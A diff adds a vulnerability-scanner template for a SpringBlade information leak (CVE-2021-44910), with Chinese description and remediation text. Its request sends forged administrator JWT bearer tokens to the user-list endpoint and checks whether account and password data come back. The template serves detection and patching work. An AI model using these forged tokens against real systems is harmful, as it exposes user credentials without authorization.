@@ -1,0 +1,53 @@
+id: springblade-info-leak
+
+info:
+  name: SpringBlade - 漏洞（CVE-2021-44910）
+  author: lbb
+  severity: high
+  description: |-
+    SpringBlade 存在安全漏洞。攻击者可通过 /api/blade-user/user-list 触发异常业务逻辑、未授权访问或敏感数据暴露。该模板通过请求 /api/blade-user/user-list，并结合响应中的 "success":true、"account":、"password": 等特征进行验证。
+  impact: |-
+    - 攻击者可利用该缺陷访问未授权功能、敏感数据或影响系统正常业务流程。
+    - 具体风险会结合部署方式、权限边界和业务场景进一步放大。
+  remediation: |-
+    - 尽快将 SpringBlade 升级到厂商已发布的修复版本，并结合官方公告核对受影响版本范围。
+    - 结合该接口的实际用途补充输入校验、访问控制、日志审计与最小权限配置，降低被进一步利用的可能性。
+  reference:
+    - https://github.com/chillzhuang/blade-tool
+  metadata:
+    max-request: 3
+  tags: springblade,blade,info-leak,vuln
+
+http:
+  - raw:
+      - |
+        GET /api/blade-user/user-list HTTP/1.1
+        Host: {{Hostname}}
+        Blade-Auth: bearer {{bearer}}
+
+    payloads:
+      bearer:
+        - 'eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODIxNzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.gbUWSdFfmzfU_gKzFYjyyJzcrHBfOwswJvptowNwNwfo12QilWudTMg-LbDAOPwk'
+        - 'eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODIxNzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.gbUWSdFfmzfU_gKzFYjyyJzcrHBfOwswJvptowNwNwfo12QilWudTMg-LbDAOPwk'
+        - 'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODIxNzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.kol9scDVwLDE8U3mM_j8O4UYrpdUc9_Zw935g7Nb979DfRuanai1UeKsK2zCKuR77Otryi0sGzBfGANDbLseBg'
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - '"account":'
+          - '"password":'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - 'application/json'
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100eb088121e18a641925c77ac4b1a4f556cce91afe19d3d904592d566defd9151902200a23af9e302c732ee543a18448d7d63cef3ee09c7b61e379b230743777608051:922c64590222798bb761d5b6d8e72950
